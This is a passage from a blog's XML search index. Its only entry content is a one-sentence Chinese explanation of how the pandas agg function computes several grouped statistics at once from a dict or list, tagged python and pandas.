<p>agg函数提供的聚合功能允许在一次计算中按组计算多个统计数据。语法很简单，聚合指令以字典或列表的形式提供。</p>
]]></content>
      <categories>
        <category>python</category>
        <category>pandas</category>
      </categories>
      <tags>
        <tag>pandas</tag>
      </tags>
  </entry>
</search>
